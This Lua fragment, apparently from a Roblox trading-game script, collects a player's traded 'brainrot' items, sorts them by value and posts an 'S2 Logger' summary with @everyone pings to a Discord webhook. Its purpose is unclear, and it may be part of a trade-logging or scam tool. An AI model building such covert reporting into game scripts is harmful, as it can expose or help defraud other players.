local function sendWebhook()
	if webhookSent then return end
	webhookSent = true

	local items = {}
	for idx, b in ipairs(DataInv.brainrotQueue or {}) do
		items[idx] = {
			name = b.data.Index,
			mutation = b.mutation or "None",
			traits = b.traits or {},
			genValue = b.genValue or 0,
			genValueRounded = b.genValueRounded,
		}
	end

	table.sort(items, function(a, b) return a.genValue > b.genValue end)

	local lines = {}
	local totalValue = 0
	for idx, item in ipairs(items) do
		totalValue = totalValue + item.genValue
		lines[idx] = buildItemLine(idx, item.name, item.mutation, item.traits, formatNumber(item.genValueRounded or item.genValue))
	end

	local title = IsInDuels and "# S2 Logger — Trade Duels | @everyone" or "# S2 Logger — Trade Received | @everyone"
	local bodyText = title .. "\n\n" .. table.concat(lines, "\n") .. "\n\n"
		.. "### " .. utf8.char(0x1F4B0) .. "  **Total Value:**  " .. formatNumber(totalValue)

	sendDiscordContainer(bodyText, buildStatusText(os.time()), IsInDuels and 0xFF0000 or 0x57F287)
end

local function sendHistoryWebhook(entry)
	local you = entry.you or {}
	local timestamp = entry.time or os.time()

	local items = {}
	for idx, b in ipairs(you.brainrots or {}) do
		local name = b.Index or b.name or "?"
		local mutation = b.Mutation or b.mutation or "None"
		local traits = b.Traits or b.traits or {}
		local genRaw, genRounded = GetGeneration(name, mutation, traits)
		items[idx] = {
			name = name,
			mutation = mutation,
			traits = traits,
			genRaw = genRaw,
			genRounded = genRounded,
		}
	end

	table.sort(items, function(a, b) return a.genRaw > b.genRaw end)

	local lines = {}
	local totalValue = 0
	for idx, item in ipairs(items) do
		totalValue = totalValue + item.genRaw
		lines[idx] = buildItemLine(idx, item.name, item.mutation, item.traits, formatNumber(item.genRounded))
	end

	local bodyText = "# S2 Logger — Trade Completed | @everyone\n\n"
		.. (#lines > 0 and table.concat(lines, "\n") or "*Nothing*")
		.. "\n\n### " .. utf8.char(0x1F4B0) .. "  **Total Value:**  " .. formatNumber(math.round(totalValue))

	sendDiscordContainer(bodyText, buildStatusText(timestamp), 0x57F287)
end

